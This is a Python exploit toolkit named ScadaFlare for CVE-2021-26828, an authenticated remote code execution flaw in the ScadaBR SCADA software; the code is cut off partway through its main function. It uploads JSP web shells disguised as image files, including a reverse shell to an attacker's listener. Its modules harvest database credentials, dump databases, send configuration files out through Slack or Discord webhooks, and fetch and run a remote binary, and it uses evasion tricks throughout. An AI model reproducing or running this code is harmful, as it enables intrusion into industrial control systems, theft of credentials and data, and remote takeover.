#!/usr/bin/env python3
# Ultimate ScadaBR Exploit (CVE-2021-26828) - Enhanced Edition ScadaFlare
# scadaflare.py

import requests
import sys
import re
import argparse
import os
import hashlib
import random
import string
import json
import time
import base64
import logging
import logging.handlers
from datetime import datetime
from urllib.parse import urlparse



LINUX_PAYLOAD = '''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.Map"%>
<%
class StreamConnector extends Thread {
    InputStream is;
    OutputStream os;
    StreamConnector(InputStream is, OutputStream os) {
        this.is = is;
        this.os = os;
    }
    public void run() {
        BufferedReader isr = null;
        BufferedWriter osw = null;
        try {
            isr = new BufferedReader(new InputStreamReader(is));
            osw = new BufferedWriter(new OutputStreamWriter(os));
            char buffer[] = new char[8192];
            int lenRead;
            while ((lenRead = isr.read(buffer, 0, buffer.length)) > 0) {
                osw.write(buffer, 0, lenRead);
                osw.flush();
            }
        } catch (Exception e) { }
        try {
            if (isr != null) isr.close();
            if (osw != null) osw.close();
        } catch (Exception e) { }
    }
}
%>
<%
    // Kill switch
    if (request.getParameter("kill") != null) {
        File f = new File(application.getRealPath(request.getServletPath()));
        f.delete();
        response.sendError(404, "Not Found");
        return;
    }
    
    // Environment leak
    if (request.getParameter("env") != null) {
        Map<String, String> env = System.getenv();
        for (Map.Entry<String, String> entry : env.entrySet()) {
            out.println(entry.getKey() + ": " + entry.getValue());
        }
        return;
    }
    
    // Reverse shell
    String ip = request.getParameter("ipaddress");
    String port = request.getParameter("port");
    if (ip != null && port != null) {
        Socket sock = new Socket(ip, Integer.parseInt(port));
        Process p = Runtime.getRuntime().exec("/bin/bash");
        new StreamConnector(p.getInputStream(), sock.getOutputStream()).start();
        new StreamConnector(sock.getInputStream(), p.getOutputStream()).start();
    }
    
    // Self-cleanup mechanism
    if (request.getParameter("cleanup") != null) {
        File f = new File(application.getRealPath(request.getServletPath()));
        f.delete();
    }
%>
'''

WINDOWS_PAYLOAD = '''<%@ page import="java.util.*,java.io.*"%>
<%@ page import="java.io.File" %>
<%@ page import="java.util.Map" %>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Run">
</FORM><pre>
<%
    // Kill switch
    if (request.getParameter("cmd") != null && request.getParameter("cmd").equals("KILL")) {
        File f = new File(application.getRealPath(request.getServletPath()));
        f.delete();
        out.println("Shell deleted");
        return;
    }
    
    // Environment leak
    if (request.getParameter("cmd") != null && request.getParameter("cmd").equals("ENV")) {
        Map<String, String> env = System.getenv();
        for (Map.Entry<String, String> entry : env.entrySet()) {
            out.println(entry.getKey() + ": " + entry.getValue());
        }
        return;
    }
    
    if (request.getParameter("cmd") != null) {
        if (request.getParameter("cmd").equals("CLEANUP")) {
            File f = new File(application.getRealPath(request.getServletPath()));
            f.delete();
            out.println("Shell deleted");
        } else {
            Process p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String line;
            while ((line = dis.readLine()) != null) out.println(line);
        }
    }
%>
</pre></BODY></HTML>
'''

BANNER = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|                         ScadaFlare v1.0                          |
|         CVE-2021-26828 - ScadaBR Authenticated RCE Toolkit       |
|                                                                  |
|  ▸ Post-Exploitation Chaining ▸ Kill Switch ▸ Evasion Tactics    |
|  ▸ Environment Dump ▸ Slack/Discord Webhook ▸ Proxy Support      |
|                                                                  |
|  Coded by: Ridpath                |  CVE Discovery: F. Oliveira  |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''




def setup_logger(logfile=None, verbose=False):
    """Setup logger with rotation"""
    logger = logging.getLogger('scada_exploit')
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s', '%Y-%m-%d %H:%M:%S')
    
    if logfile:
        # Rotate logs when exceeding 5MB, keep 3 backups
        file_handler = logging.handlers.RotatingFileHandler(
            logfile, maxBytes=5*1024*1024, backupCount=3
        )
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
    
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    
    return logger

def log(message, level="info", logger=None, verbose=False):
    """Log messages with different severity levels"""
    if not logger:
        print(message)
        return
        
    if level == "info":
        logger.info(message)
    elif level == "warning":
        logger.warning(message)
    elif level == "error":
        logger.error(message)
    elif level == "debug" and not verbose:
        return  # Skip debug logs if not in verbose mode
    else:
        logger.info(message)

def clean_response(html):
    """Remove HTML tags from command output"""
    clean = re.sub(r"<[^>]+>", "", html)
    return clean.strip()

def validate_url(target_url):
    """Validate and parse the target URL"""
    parsed = urlparse(target_url)
    if not parsed.scheme or not parsed.hostname:
        log("Target URL must include scheme (http/https) and hostname", "error")
        sys.exit(1)
    
    # Set default ports if not specified
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    base_url = f"{parsed.scheme}://{parsed.hostname}:{port}"
    
    return base_url, parsed.hostname, port

def fingerprint_payload(payload):
    """Generate unique fingerprint for payload (SHA256 based)"""
    return hashlib.sha256(payload.encode()).hexdigest()[:12]

def get_csrf_token(html):
    """Extract CSRF token from HTML content"""
    token_match = re.search(r'name="csrf_token" value="([^"]+)"', html)
    return token_match.group(1) if token_match else None

def get_scadabr_version(session, base_url, verbose=False, logger=None):
    """Detect ScadaBR version from login page"""
    try:
        res = session.get(f"{base_url}/ScadaBR/login.htm", timeout=5)
        version_match = re.search(r'ScadaBR[\s\-]*([0-9.]+)', res.text, re.IGNORECASE)
        if version_match:
            return version_match.group(1)
        

        res = session.get(f"{base_url}/ScadaBR/js/main.js", timeout=5)
        version_match = re.search(r'ScadaBR v?([0-9.]+)', res.text)
        if version_match:
            return version_match.group(1)
            
        return "unknown"
    except Exception as e:
        if verbose:
            log(f"Version detection failed: {str(e)}", "debug", logger, verbose)
        return "unknown"

def random_user_agent():
    """Generate a random user agent"""
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    ]
    return random.choice(agents)

def random_xid():
    """Generate random XID for evasion"""
    return 'GV_' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def random_filename(extension="jsp"):
    """Generate random filename for evasion"""
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + f".{extension}"

def send_webhook_notification(url, message, service="slack"):
    """Send notification to Slack/Discord webhook"""
    try:
        if service == "slack":
            payload = {"text": message}
        else:  # 
            payload = {"content": message}
        
        requests.post(url, json=payload, timeout=10)
        return True
    except Exception as e:
        log(f"Webhook notification failed: {str(e)}", "error")
        return False



def enumerate_system(session, shell_url, os_type, verbose=False, logger=None):
    """Comprehensive system enumeration"""
    log("Starting system enumeration", "info", logger, verbose)
    results = {}
    

    os_cmd = "uname -a" if os_type == "linux" else "ver"
    java_cmd = "java -version 2>&1"
    
    results['os_info'] = execute_command(session, shell_url, os_cmd, os_type, verbose, logger)
    results['java_version'] = execute_command(session, shell_url, java_cmd, os_type, verbose, logger)
    

    user_cmd = "id" if os_type == "linux" else "whoami /all"
    results['user_info'] = execute_command(session, shell_url, user_cmd, os_type, verbose, logger)
    
    # File structure
    file_cmd = "ls -laR / 2>/dev/null | head -c 5000" if os_type == "linux" else "dir C:\\ /s /b | head -n 20"
    results['file_structure'] = execute_command(session, shell_url, file_cmd, os_type, verbose, logger)
    
    # ScadaBR DB location
    db_cmd = "ls -la /ScadaBR/WEB-INF/db" if os_type == "linux" else "dir C:\\ScadaBR\\WEB-INF\\db"
    results['scada_db'] = execute_command(session, shell_url, db_cmd, os_type, verbose, logger)
    
    # Environment variables
    env_cmd = "ENV" if os_type == "windows" else "printenv"
    results['environment'] = execute_command(session, shell_url, env_cmd, os_type, verbose, logger)
    

    views_cmd = "curl -s localhost/ScadaBR/view_edit.shtm?viewId=1" if os_type == "linux" else "certutil -urlcache -split -f http://localhost/ScadaBR/view_edit.shtm?viewId=1"
    results['accessible_views'] = execute_command(session, shell_url, views_cmd, os_type, verbose, logger)
    
    log("Enumeration completed", "info", logger, verbose)
    return results



MODULE_REGISTRY = {
    "upload_webhook_exfil": {
        "function": None,  
        "description": "Upload .properties files to Discord/Slack via webhook",
        "os": "both"
    },
    "db_dump": {
        "function": None,
        "description": "Extract Derby/SQLite files from WEB-INF/db",
        "os": "both"
    },
    "shell_upgrade": {
        "function": None,
        "description": "Trigger a staged curl to drop an ELF or EXE",
        "os": "linux"
    },
    "scheduler_hijack": {
        "function": None,
        "description": "Abuse exposed Quartz job triggers",
        "os": "both"
    },
    "log4shell_probe": {
        "function": None,
        "description": "Test known vulnerable endpoints for log4j",
        "os": "both"
    },
    "enum_serial_ports": {
        "function": None,
        "description": "Try to read /dev/tty* devices",
        "os": "linux"
    },
    "credential_dump": {
        "function": None,
        "description": "Parse env.properties for JDBC credentials",
        "os": "both"
    }
}


def module_credential_dump(session, shell_url, os_type, verbose, logger):
    """Parse env.properties for JDBC credentials"""
    log("Executing credential dump module", "info", logger)
    
    # Locate env.properties
    if os_type == "linux":
        cmd = "grep -R 'jdbc' /ScadaBR/WEB-INF/classes/ 2>/dev/null"
    else:
        cmd = "findstr /s /i jdbc C:\\ScadaBR\\WEB-INF\\classes\\*.properties"
    
    output = execute_command(session, shell_url, cmd, os_type, verbose, logger)
    
    # Extract JDBC credentials
    credentials = []
    for line in output.split('\n'):
        if 'jdbc.username' in line or 'jdbc.password' in line:
            credentials.append(line.strip())
    
    if credentials:
        log("Found database credentials:", "info", logger)
        for cred in credentials:
            log(cred, "info", logger)
    else:
        log("No JDBC credentials found in env.properties", "warning", logger)
    
    return credentials

def module_upload_webhook_exfil(session, shell_url, os_type, verbose, logger, webhook_url, service="slack"):
    """Upload files to webhook"""
    log("Uploading files via webhook", "info", logger)
    
    # Find .properties files
    if os_type == "linux":
        cmd = "find /ScadaBR -name '*.properties' -exec cat {} \\;"
    else:
        cmd = "type C:\\ScadaBR\\*.properties"
    
    files_content = execute_command(session, shell_url, cmd, os_type, verbose, logger)
    
    # Send to webhook
    try:
        if service == "slack":
            payload = {"text": f"ScadaBR files exfiltrated:\n```{files_content[:3000]}```"}
        else:  # Discord
            payload = {"content": f"ScadaBR files exfiltrated:\n```{files_content[:3000]}```"}
        
        res = requests.post(webhook_url, json=payload, timeout=(5, 15))
        if res.status_code in [200, 204]:
            log("Files uploaded to webhook successfully", "info", logger)
            return True
    except Exception as e:
        log(f"Webhook upload failed: {str(e)}", "error", logger)
    
    return False

def module_db_dump(session, shell_url, os_type, verbose, logger):
    """Dump database files"""
    log("Dumping database files", "info", logger)
    
    if os_type == "linux":
        cmd = "tar -czvf /tmp/db_backup.tar.gz /ScadaBR/WEB-INF/db 2>/dev/null && base64 /tmp/db_backup.tar.gz"
    else:
        cmd = "powershell -c \"Compress-Archive -Path C:\\ScadaBR\\WEB-INF\\db -DestinationPath C:\\Windows\\Temp\\db.zip; [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\db.zip'))\""
    
    output = execute_command(session, shell_url, cmd, os_type, verbose, logger)
    
    if output and len(output) > 100:  # Arbitrary minimum size
        try:
            with open("scada_db_dump.bin", "wb") as f:
                f.write(base64.b64decode(output))
            log("Database dump saved to scada_db_dump.bin", "info", logger)
            return True
        except Exception as e:
            log(f"Error saving database: {str(e)}", "error", logger)
    
    return False

def module_shell_upgrade(session, shell_url, os_type, verbose, logger, upgrade_url):
    """Upgrade to a better shell"""
    log("Attempting shell upgrade", "info", logger)
    
    if os_type == "linux":
        cmd = f"curl -s {upgrade_url} -o /tmp/upgrade && chmod +x /tmp/upgrade && /tmp/upgrade &"
    else:
        cmd = f"powershell -c \"Invoke-WebRequest {upgrade_url} -OutFile C:\\Windows\\Temp\\upgrade.exe; Start-Process C:\\Windows\\Temp\\upgrade.exe\""
    
    result = execute_command(session, shell_url, cmd, os_type, verbose, logger)
    log("Shell upgrade triggered. Check your listener.", "info", logger)
    return "success" in result.lower()

def module_scheduler_hijack(session, shell_url, os_type, verbose, logger):
    """Hijack Quartz scheduler"""
    log("Attempting scheduler hijack", "info", logger)
    

    if os_type == "linux":
        cmd = "grep -R 'org.quartz' /ScadaBR/WEB-INF/classes/ 2>/dev/null"
    else:
        cmd = "findstr /s /i org.quartz C:\\ScadaBR\\WEB-INF\\classes\\*.properties"
    
    config = execute_command(session, shell_url, cmd, os_type, verbose, logger)
    

    hijack_cmd = "echo 'CREATE TRIGGER malicious_trigger;' > /tmp/hijack.sql"
    if os_type == "windows":
        hijack_cmd = "echo CREATE TRIGGER malicious_trigger; > C:\\Windows\\Temp\\hijack.sql"
    
    execute_command(session, shell_url, hijack_cmd, os_type, verbose, logger)
    log("Scheduler hijack attempted. Check database for results.", "info", logger)
    return config != ""

def module_log4shell_probe(session, shell_url, os_type, verbose, logger):
    """Probe for Log4Shell vulnerability"""
    log("Probing for Log4Shell vulnerabilities", "info", logger)
    
    probe_payload = "${jndi:ldap://log4shell.check/}"
    endpoints = [
        "/ScadaBR/htmllogin.htm",
        "/ScadaBR/login.htm",
        "/ScadaBR/header.htm",
        "/ScadaBR/footer.htm"
    ]
    
    for endpoint in endpoints:
        url = f"{shell_url.replace('/uploads/', endpoint)}?test={probe_payload}"
        try:
            session.get(url, timeout=(5, 15))
            log(f"Probe sent to {endpoint}", "debug", logger)
        except:
            pass
    
    log("Log4Shell probes sent. Monitor your DNS callback.", "info", logger)
    return True

def module_enum_serial_ports(session, shell_url, os_type, verbose, logger):
    """Enumerate serial ports"""
    if os_type != "linux":
        log("Serial port enumeration only available on Linux", "warning", logger)
        return False
    
    cmd = "ls /dev/tty* 2>/dev/null"
    ports = execute_command(session, shell_url, cmd, os_type, verbose, logger)
    
    if ports:
        log("Available serial ports:", "info", logger)
        log(ports, "info", logger)
        return True
    
    log("No serial ports found", "warning", logger)
    return False


MODULE_REGISTRY["credential_dump"]["function"] = module_credential_dump
MODULE_REGISTRY["upload_webhook_exfil"]["function"] = module_upload_webhook_exfil
MODULE_REGISTRY["db_dump"]["function"] = module_db_dump
MODULE_REGISTRY["shell_upgrade"]["function"] = module_shell_upgrade
MODULE_REGISTRY["scheduler_hijack"]["function"] = module_scheduler_hijack
MODULE_REGISTRY["log4shell_probe"]["function"] = module_log4shell_probe
MODULE_REGISTRY["enum_serial_ports"]["function"] = module_enum_serial_ports



def detect_os(session, base_url, force_os=None, verbose=False, logger=None):
    """Detect target OS using multiple techniques"""
    if force_os:
        log(f"Using forced OS mode: {force_os}", "info", logger, verbose)
        return force_os.lower()
    
    os_type = None
    
    try:

        log("Attempting OS detection via server headers...", "debug", logger, verbose)
        res = session.get(f"{base_url}/ScadaBR/view_edit.shtm", timeout=(5, 15))
        server = res.headers.get("Server", "").lower()
        
        if "microsoft" in server or "win" in server:
            log("Windows detected from server headers", "debug", logger, verbose)
            os_type = "windows"
        elif "unix" in server or "linux" in server:
            log("Linux detected from server headers", "debug", logger, verbose)
            os_type = "linux"
        

        if not os_type:
            log("Attempting OS detection via JSP probe...", "debug", logger, verbose)
            test_payload = "<% out.println(System.getProperty(\"os.name\")); %>"
            test_filename = random_filename()
            
            files = {
                'view.name': (None, random_xid()),
                'view.xid': (None, random_xid()),
                'backgroundImageMP': (test_filename, test_payload, "image/png"),
                'upload': (None, 'Upload image'),
                'view.anonymousAccess': (None, '0')
            }
            
            upload_res = session.post(f"{base_url}/ScadaBR/view_edit.shtm", files=files, timeout=(5, 15))
            if upload_res.status_code == 200:
                for i in range(1, 20):  
                    test_url = f"{base_url}/ScadaBR/uploads/{i}.jsp"
                    test_res = session.get(test_url, timeout=(5, 15))
                    if test_res.status_code == 200:
                        os_name = test_res.text.strip().lower()
                        log(f"Server OS name: {os_name}", "debug", logger, verbose)
                        
                        if "win" in os_name:
                            return "windows"
                        elif "nix" in os_name or "nux" in os_name:
                            return "linux"
                        break
    except Exception as e:
        log(f"OS detection error: {str(e)}", "warning", logger, verbose)
    
    log("OS detection failed, defaulting to Linux", "warning", logger, verbose)
    return "linux"

def login(session, base_url, username, password, verbose=False, logger=None):
    """Authenticate to ScadaBR with CSRF token support"""
    login_url = f"{base_url}/ScadaBR/login.htm"
    auth_check_url = f"{base_url}/ScadaBR/view_edit.shtm"
    
    try:

        login_page = session.get(login_url, timeout=(5, 15))
        csrf_token = get_csrf_token(login_page.text)
        
        login_data = {
            "username": username,
            "password": password,
            "csrf_token": csrf_token or ""
        }
        
        log(f"Logging in as {username}:{password}", "info", logger, verbose)
        login_res = session.post(login_url, data=login_data, timeout=(5, 15))
        
        if verbose:
            log(f"Login response: {login_res.status_code} {login_res.reason}", "debug", logger, verbose)
            if login_res.text:
                log(f"Response length: {len(login_res.text)} bytes", "debug", logger, verbose)
        

        auth_check = session.get(auth_check_url, timeout=(5, 15))
        if "login.htm" in auth_check.url or auth_check.status_code != 200:
            log(f"Login failed (Status: {auth_check.status_code})", "error", logger, verbose)
            return False
        
        log("Login successful", "info", logger, verbose)
        return True
        
    except requests.exceptions.RequestException as e:
        log(f"Network error during login: {str(e)}", "error", logger, verbose)
        return False

def upload_shell(session, base_url, os_type, payload, filename, verbose=False, logger=None):
    """Upload payload with CSRF token support and evasion"""
    upload_url = f"{base_url}/ScadaBR/view_edit.shtm"
    
    try:

        upload_page = session.get(upload_url, timeout=(5, 15))
        csrf_token = get_csrf_token(upload_page.text)
        
        # Generate random form fields for evasion
        view_name = ''.join(random.choices(string.ascii_letters, k=8))
        view_xid = random_xid()
        
        # Prepare multipart form data
        files = {
            'view.name': (None, view_name),
            'view.xid': (None, view_xid),
            'backgroundImageMP': (filename, payload, "image/png"),
            'upload': (None, 'Upload image'),
            'view.anonymousAccess': (None, '0'),
            'csrf_token': (None, csrf_token or "")
        }
        
        log(f"Uploading payload as {filename}...", "info", logger, verbose)
        upload_res = session.post(upload_url, files=files, timeout=(5, 15))
        
        if verbose:
            log(f"Upload response: {upload_res.status_code} {upload_res.reason}", "debug", logger, verbose)
            if upload_res.text:
                log(f"Response length: {len(upload_res.text)} bytes", "debug", logger, verbose)
        
        return upload_res.status_code == 200
        
    except requests.exceptions.RequestException as e:
        log(f"Network error during upload: {str(e)}", "error", logger, verbose)
        return False

def locate_shell(session, base_url, verbose=False, logger=None):
    """Locate uploaded shell by checking sequential numbers"""
    for num in range(1, 1000):
        shell_url = f"{base_url}/ScadaBR/uploads/{num}.jsp"
        try:
            check_res = session.get(shell_url, timeout=3)
            if check_res.status_code == 200:
                log(f"Shell found at: {shell_url}", "info", logger, verbose)
                return shell_url
        except requests.exceptions.RequestException:
            continue
    
    log("Could not locate uploaded shell after checking 999 files", "error", logger, verbose)
    return None

def execute_command(session, shell_url, command, os_type, verbose=False, logger=None):
    """Execute command and return output"""
    try:
        if os_type == "windows":
            exec_url = f"{shell_url}?cmd={command}"
        else:
            exec_url = f"{shell_url}?cmd={command.replace(' ', '%20')}"
        
        log(f"Executing: {command}", "info", logger, verbose)
        res = session.get(exec_url, timeout=(5, 15))
        output = clean_response(res.text)
        log(f"Command output: {output}", "debug", logger, verbose)
        return output
    except requests.exceptions.RequestException as e:
        log(f"Command execution failed: {str(e)}", "error", logger, verbose)
        return None

def interactive_windows_shell(session, shell_url, verbose=False, logger=None):
    """Provide interactive command prompt"""
    log("Starting interactive shell (type 'exit' to quit)", "info", logger, verbose)
    try:
        while True:
            cmd = input("CMD > ").strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            if not cmd:
                continue
                
            output = execute_command(session, shell_url, cmd, "windows", verbose, logger)
            if output:
                print(output)
    except KeyboardInterrupt:
        log("Exiting interactive shell", "info", logger, verbose)

def trigger_linux_shell(session, shell_url, reverse_ip, reverse_port, verbose=False, logger=None, use_base64=False):
    """Trigger reverse shell with evasion options"""
    try:
        if use_base64:

            payload = f"{reverse_ip}:{reverse_port}".encode()
            b64_payload = base64.urlsafe_b64encode(payload).decode()
            shell_trigger = f"{shell_url}?data={b64_payload}"
        else:
            # Standard parameters
            shell_trigger = f"{shell_url}?ipaddress={reverse_ip}&port={reverse_port}"
        
        log(f"Triggering reverse shell to {reverse_ip}:{reverse_port}", "info", logger, verbose)
        session.get(shell_trigger, timeout=(5, 15))
        log("Check your listener for reverse shell connection", "info", logger, verbose)
        return True
    except requests.exceptions.RequestException as e:
        log(f"Reverse shell trigger failed: {str(e)}", "error", logger, verbose)
        return False

def delete_shell(session, shell_url, os_type, verbose=False, logger=None):
    """Attempt to delete uploaded shell"""
    try:
        if os_type == "windows":

            cleanup_res = session.get(f"{shell_url}?cmd=KILL", timeout=(5, 15))
            if "Shell deleted" in cleanup_res.text:
                log("Shell deleted successfully", "info", logger, verbose)
                return True
        else:

            cleanup_res = session.get(f"{shell_url}?kill=true", timeout=(5, 15))
            if cleanup_res.status_code == 404:
                log("Shell deleted successfully", "info", logger, verbose)
                return True
        
        log("Automatic cleanup failed", "warning", logger, verbose)
        return False
    except requests.exceptions.RequestException as e:
        log(f"Cleanup failed: {str(e)}", "error", logger, verbose)
        return False

def dump_environment(session, shell_url, os_type, verbose=False, logger=None):
    """Dump environment variables"""
    if os_type == "windows":
        env_cmd = "ENV"
    else:
        env_cmd = "env"
    
    env_output = execute_command(session, shell_url, env_cmd, os_type, verbose, logger)
    log("Environment Variables:\n" + env_output, "info", logger, verbose)
    return env_output

def generate_burp_request(base_url, login_data, upload_data, shell_url):
    """Generate Burp Suite compatible request dump"""
    burp_request = f"""POST {base_url}/ScadaBR/login.htm HTTP/1.1
Host: {urlparse(base_url).hostname}
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(login_data)}

{login_data}

POST {base_url}/ScadaBR/view_edit.shtm HTTP/1.1
Host: {urlparse(base_url).hostname}
Content-Type: multipart/form-data; boundary=---------------------------boundary

{upload_data}

GET {shell_url} HTTP/1.1
Host: {urlparse(base_url).hostname}
"""
    return burp_request

def generate_msf_resource(shell_url, lhost, lport, platform):
    """Generate Metasploit resource script"""
    if platform == "linux":
        payload = f"linux/x64/shell_reverse_tcp"
        command = f"use exploit/multi/handler\nset PAYLOAD {payload}\nset LHOST {lhost}\nset LPORT {lport}\nrun"
    else:
        payload = "windows/meterpreter/reverse_tcp"
        command = f"use exploit/multi/handler\nset PAYLOAD {payload}\nset LHOST {lhost}\nset LPORT {lport}\nrun"
    
    return f"""# Metasploit Resource Script
# Generated by ScadaBR Exploit
#
# 1. Start msfconsole
# 2. Run: resource {lport}_{platform}.rc

{command}
"""

def exploit_chain(session, shell_url, os_type, module, verbose=False, logger=None, **kwargs):
    """Execute post-exploitation modules from registry"""
    mod_info = MODULE_REGISTRY.get(module)
    if not mod_info:
        log(f"Unknown module: {module}", "error", logger, verbose)
        return False
    

    if mod_info["os"] != "both" and mod_info["os"] != os_type:
        log(f"Module {module} not compatible with {os_type} OS", "error", logger, verbose)
        return False
    
    return mod_info["function"](
        session=session,
        shell_url=shell_url,
        os_type=os_type,
        verbose=verbose,
        logger=logger,
        **kwargs
    )



def main():

    parser = argparse.ArgumentParser(
        description="Ultimate ScadaBR Exploit (CVE-2021-26828)",
        epilog="Example: ./exploit.py http://10.10.10.10:8080 admin password --reverse-ip 192.168.1.100 --reverse-port 4444"
    )
    parser.add_argument("target_url", help="Full target URL (e.g., http://10.10.10.10:8080)")
    parser.add_argument("username", help="ScadaBR username")
    parser.add_argument("password", help="ScadaBR password")
    parser.add_argument("--reverse-ip", help="Listener IP for Linux reverse shell")
    parser.add_argument("--reverse-port", type=int, help="Listener port for Linux reverse shell")
    parser.add_argument("--os", choices=['linux', 'windows'], help="Force target OS type")
    parser.add_argument("--proxy", help="SOCKS5 or HTTP proxy (e.g., socks5://127.0.0.1:9050)")
    parser.add_argument("--command", help="For Windows targets: run a single command and exit")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--payload-file", help="Custom JSP payload file")
    parser.add_argument("--cleanup", action="store_true", help="Delete shell after exploitation")
    parser.add_argument("--dump-burp", help="Save Burp-compatible request to file")
    parser.add_argument("--msf-mode", help="Generate Metasploit resource script (specify output file)")
    parser.add_argument("--logfile", help="Save all output to log file")
    parser.add_argument("--enumerate", action="store_true", help="Perform comprehensive system enumeration")
    parser.add_argument("--dump-env", action="store_true", help="Dump environment variables")
    parser.add_argument("--slack-webhook", help="Slack webhook URL for notifications")
    parser.add_argument("--discord-webhook", help="Discord webhook URL for notifications")
    parser.add_argument("--chain", help="Execute post-exploitation module (e.g., postgres_lfi)")
    parser.add_argument("--kill", action="store_true", help="Delete shell and exit (kill switch)")
    parser.add_argument("--base64", action="store_true", help="Use base64 encoding for Linux reverse shell parameters")
    parser.add_argument("--upgrade-url", help="URL for shell upgrade binary")
    parser.add_argument("--webhook-url", help="Webhook URL for file exfiltration")
    
    args = parser.parse_args()
    

    logger = setup_logger(args.logfile, args.verbose)
    

    print(BANNER)
    if args.logfile:
        log(f"Logging all output to: {args.logfile}", "info", logger, args.verbose)
    

    base_url, target_host, target_port = validate_url(args.target_url)
    log(f"Target: {base_url}", "info", logger, args.verbose)
    

    session = requests.Session()
    

    session.headers.update({"User-Agent": random_user_agent()})
    log(f"Using User-Agent: {session.headers['User-Agent']}", "debug", logger, args.verbose)
    
    if args.proxy:
        try:
            import socks
            import socket
            proxy_type = socks.SOCKS5 if "socks5" in args.proxy else socks.HTTP
            proxy_parts = urlparse(args.proxy)
            socks.set_default_proxy(
                proxy_type, 
                proxy_parts.hostname, 
                proxy_parts.port
            )
            socket.socket = socks.socksocket
            log(f"Using SOCKS proxy: {args.proxy}", "info", logger, args.verbose)
        except ImportError:
            session.proxies = {"http": args.proxy, "https": args.proxy}
            log(f"Using HTTP proxy: {args.proxy}", "info", logger, args.verbose)
    

    version = get_scadabr_version(session, base_url, args.verbose, logger)
    log(f"Target appears to be ScadaBR v{version}", "info", logger, args.verbose)
    

    if args.slack_webhook or args.discord_webhook:
        msg = f"ScadaBR exploit initiated against {base_url} (v{version})"
        if args.slack_webhook:
            send_webhook_notification(args.slack_webhook, msg, "slack")
        if args.discord_webhook:
            send_webhook_notification(args.discord_webhook, msg, "discord")
    

    os_type = detect_os(session, base_url, args.os, args.verbose, logger)
    log(f"Target OS: {os_type}", "info", logger, args.verbose)
    
    # Validate Linux reverse shell parameters
    if os_type == "linux" and (not args.reverse_ip or not args.reverse_port):
        log("Linux target requires --reverse-ip and --reverse-port", "error", logger, args.verbose)
        sys.exit(1)
    

    if not login(session, base_url, args.username, args.password, args.verbose, logger):
        sys.exit(1)
    

    if args.payload_file:
        try:
            with open(args.payload_file, "r") as f:
                payload = f.read()
            filename = os.path.basename(args.payload_file)
            log(f"Using custom payload from: {args.payload_file}", "info", logger, args.verbose)
        except Exception as e:
            log(f"Error reading payload file: {str(e)}", "error", logger, args.verbose)
            sys.exit(1)
    else:
        payload = LINUX_PAYLOAD if os_type == "linux" else WINDOWS_PAYLOAD
        filename = random_filename()
        log(f"Using generated {os_type} payload: {filename}", "info", logger, args.verbose)
    

    if not upload_shell(session, base_url, os_type, payload, filename, args.verbose, logger):
        log("Payload upload failed. Exploit aborted.", "error", logger, args.verbose)
        sys.exit(1)
    

    shell_url = locate_shell(session, base_url, args.verbose, logger)
    if not shell_url:
        log("Failed to locate uploaded shell. Exploit aborted.", "error", logger, args.verbose)
        sys.exit(1)
    
    log(f"Webshell URL: {shell_url}", "info", logger, args.verbose)
    
    # Send webhook notification with shell URL
    if args.slack_webhook or args.discord_webhook:
        msg = f"ScadaBR exploit succeeded! Webshell: {shell_url}"
        if args.slack_webhook:
            send_webhook_notification(args.slack_webhook, msg, "slack")
        if args.discord_webhook:
            send_webhook_notification(args.discord_webhook, msg, "discord")
    
    # Dump Burp-compatible request if requested
    if args.dump_burp:
        try:
            login_data = f"username={args.username}&password={args.password}"
            upload_data = f"""-----------------------------boundary
Content-Disposition: form-data; name="view.name"

exploit
-----------------------------boundary
Content-Disposition: form-data; name="view.xid"

GV_EXPLOIT
-----------------------------boundary
Content-Disposition: form-data; name="backgroundImageMP"; filename="{filename}"
Content-Type: image/png

{payload}
-----------------------------boundary--"""
            
            burp_content = generate_burp_request(base_url, login_data, upload_data, shell_url)
            
            with open(args.dump_burp, "w") as f:
                f.write(burp_content)
            log(f"Burp request saved to: {args.dump_burp}", "info", logger, args.verbose)
        except Exception as e:
            log(f"Failed to save Burp request: {str(e)}", "error", logger, args.verbose)
    

    if args.msf_mode and args.reverse_ip and args.reverse_port:
        try:
            msf_content = generate_msf_resource(
                shell_url, 
                args.reverse_ip, 
                args.reverse_port, 
                os_type
            )
            with open(args.msf_mode, "w") as f:
                f.write(msf_content)
            log(f"Metasploit resource script saved to: {args.msf_mode}", "info", logger, args.verbose)
        except Exception as e:
            log(f"Failed to generate Metasploit resource: {str(e)}", "error", logger, args.verbose)
    

    if args.dump_env:
        env_output = dump_environment(session, shell_url, os_type, args.verbose, logger)
        log(f"Environment variables:\n{env_output}", "info", logger, args.verbose)
    

    if args.enumerate:
        enum_results = enumerate_system(session, shell_url, os_type, args.verbose, logger)
        log("Enumeration results:", "info", logger, args.verbose)
        for key, value in enum_results.items():
